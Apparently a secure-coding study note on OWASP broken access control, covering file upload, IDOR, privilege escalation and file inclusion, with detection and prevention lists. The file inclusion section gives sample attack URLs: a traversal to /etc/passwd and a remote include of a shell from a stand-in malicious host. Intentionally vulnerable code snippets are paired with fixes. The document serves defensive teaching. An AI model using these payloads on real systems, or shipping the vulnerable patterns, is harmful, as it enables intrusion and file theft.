# 1. Broken Access Control:
- Flaws that `allow unauthorized users to access restricted resources.`
- OWASP Category: `A01:2021 - Broken Access Control`
- Preventions: Implement proper `role-based access control (RBAC)` and ensure `authorization checks` are enforced on both client and server sides.

# 2. File Upload Vulnerability:
- `Weaknesses in file upload functionality that allow unauthorized file types or content.`
- OWASP Category: `A01:2021 - Broken Access Control / A08:2021 - Software and Data Integrity Failures`
- Preventions: `Validate file types`, use secure file handling functions, and `scan uploaded files` for malicious content.
- Detection/Testing Methods: Penetration testing, `file type and size validation checks`, and malware scanning.
```
# Vulnerable file upload
if request.method == 'POST':
    file = request.files['file']
    file.save('/uploads/' + file.filename)


# Secure file upload
if request.method == 'POST':
    file = request.files['file']
    if file.content_type in ['image/jpeg', 'image/png']:
        file.save('/uploads/' + secure_filename(file.filename))

```

# 4. Privilege Escalation:
- Exploiting vulnerabilities `to gain higher privileges than intended.`
- OWASP Category: `A01:2021 - Broken Access Control`
- Preventions: Implement `least privilege principle`, conduct `regular audits`, and ensure `proper validation of user roles and permissions.`
- Detection/Testing Methods: Penetration testing, privilege escalation testing, and `reviewing user role assignments.`

# 5. Insecure Direct Object References (IDOR):
- Flaws that `allow unauthorized access to objects by modifying references.`
- OWASP Category: `A01:2021 - Broken Access Control`
- Preventions: `Validate object references, implement proper access controls`.
- Detection/Testing Methods: `Parameter manipulation testing, access control verification, and code reviews.`

```
# Vulnerable IDOR
document = get_document(request.args['doc_id'])

# Secure IDOR
document = get_document(request.args['doc_id'])
if not user_has_access(document):
    abort(403)
```

# 6. File Inclusion (Local and Remote):
- File Inclusion vulnerabilities `allow an attacker to include files from the server (Local File Inclusion, LFI) or from remote servers (Remote File Inclusion, RFI)` into the executed script.
- OWASP Category: `A01:2021 - Broken Access Control / A08:2021 - Software and Data Integrity Failures`
- Local File Inclusion (LFI): This allows an attacker to include files from the local server. Eg. `http://example.com/index.php?page=../../../../etc/passwd`
- Remote File Inclusion (RFI): This allows an attacker to include files from a remote server. Eg. `http://example.com/index.php?page=http://malicious.com/shell`

```
// Vulnerable to LFI and RFI
$page = $_GET['page'];
include($page . '.php');

// Secure file inclusion using a whitelist
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    // Handle unauthorized access
    echo 'Access denied!';
}
// Only files that are explicitly listed in the $allowed_pages array can be included. This prevents an attacker from including arbitrary files.
```

### Prevention:
- `Whitelist Files`: Only allow specific files to be included by using a whitelist of allowed file names.
- Sanitize Input: Always `sanitize and validate user input` to ensure it does not contain malicious characters or paths.
- `Disable Remote` File Inclusion: Ensure that allow_url_include is disabled in your PHP configuration to prevent RFI.
- `Use Static File Paths:` Avoid dynamic inclusion of files based on user input. Use static file paths wherever possible.

### Detection/Testing Methods:
- Static Code Analysis, Dynamic Analysis, Manual Testing.

## Common Detection Techniques
1. `Penetration Testing`:
- Conduct regular penetration tests to identify and exploit broken access control vulnerabilities.
- Use both manual and automated testing tools to ensure comprehensive coverage.

2. `Static Code Analysis`:
- Use static analysis tools to scan the codebase for access control flaws and misconfigurations.
- Review access control logic and implementation during code reviews.

3. `Dynamic Analysis`
- Employ dynamic analysis tools to simulate attacks and identify runtime access control vulnerabilities.
- Test for unauthorized access to resources and functionalities.

4. `Manual Testing`
- Manually test the application by manipulating URLs, parameters, and sessions to bypass access controls.
- Verify that access control mechanisms are correctly implemented and enforced.

4. `Log Monitoring and Analysis`
- Monitor application logs for signs of unauthorized access attempts and anomalies.
- Implement alerting mechanisms to detect and respond to suspicious activities.

5. `Security Audits and Reviews`
- Conduct regular security audits and reviews of access control mechanisms.
- Engage third-party security experts to perform independent assessments.

6. `Automated Scanners`
- Use automated security scanners to detect common access control vulnerabilities.
- Regularly run scans to identify new vulnerabilities introduced by code changes.

### Common Prevention Techniques
1 . `Implement Role-Based Access Control (RBAC)`
- Define and enforce user roles with specific permissions.
- Ensure that users can only access resources and functionalities that match their roles.

2. `Use Secure Frameworks and Libraries`
- Utilize frameworks and libraries that provide built-in access control mechanisms.
- Regularly update and patch these frameworks to mitigate new vulnerabilities.

3. `Validate Access on the Server-Side`
- Perform access control checks on the server-side to prevent clients from bypassing them.
- Avoid relying solely on client-side access control.

4. `Enforce Principle of Least Privilege`
- Grant users the minimum level of access required to perform their tasks.
- Regularly review and adjust permissions as needed.
  
5. `Use Indirect Object References`
- Implement indirect references (e.g., mapping IDs) instead of exposing direct object references.
- Validate access to the mapped objects on the server-side.

6. `Implement Secure Coding Practices`
- Use parameterized queries to avoid injection attacks that could bypass access controls.
- Sanitize and validate all user inputs.

7. `Utilize Access Control Lists (ACLs)`
- Define and maintain ACLs to specify access permissions for resources.
- Ensure ACLs are up-to-date and accurately reflect the required access controls.

8. `Regularly Audit and Monitor Access Controls`
- Conduct regular audits of access control mechanisms and permissions.
- Implement logging and monitoring to detect and respond to unauthorized access attempts.
